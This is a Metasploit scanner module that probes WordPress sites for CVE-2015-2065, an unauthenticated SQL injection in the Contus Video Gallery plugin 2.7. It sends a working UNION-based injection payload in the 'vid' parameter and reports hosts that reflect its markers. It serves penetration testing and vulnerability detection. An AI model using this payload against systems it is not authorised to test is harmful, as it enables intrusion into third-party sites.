##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'WordPress Contus Video Gallery Unauthenticated SQL Injection Scanner',
      'Description' => %q{
      This module attempts to exploit a UNION-based SQL injection in Contus Video
      Gallery for Wordpress version 2.7 and likely prior in order if the instance is
      vulnerable.
      },
      'Author'       =>
        [
          'Claudio Viviani', #discovery
          'bperry' #metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2015-2065'],
          [ 'WPVDB', '7793' ]
        ],
      'DisclosureDate' => 'Feb 24 2015'))
  end

  def run_host(ip)
    right_marker = Rex::Text.rand_text_alpha(5)
    left_marker = Rex::Text.rand_text_alpha(5)
    flag = Rex::Text.rand_text_alpha(5)

    vprint_status("Checking host")

    res = send_request_cgi({
      'uri'       => wordpress_url_admin_ajax,
      'vars_get' => {
        'action' => 'rss',
        'type' => 'video',
        'vid' => "-1 UNION ALL SELECT NULL,NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},0x#{flag.unpack("H*")[0]},0x#{right_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- "
      }
    })
    unless res && res.body
      vprint_error("Server did not respond in an expected way")
      return
    end

    result = res.body =~ /#{left_marker}#{flag}#{right_marker}/

    if result
      print_good("Vulnerable to unauthenticated SQL injection within Contus Video Gallery 2.7 for Wordpress")
      report_vuln({
        :host  => rhost,
        :port  => rport,
        :proto => 'tcp',
        :name  => "Unauthenticated UNION-based SQL injection in Contus Video Gallery 2.7 for Wordpress",
        :refs  => self.references.select { |ref| ref.ctx_val == "2015-2065" }
      })
    end
  end
end
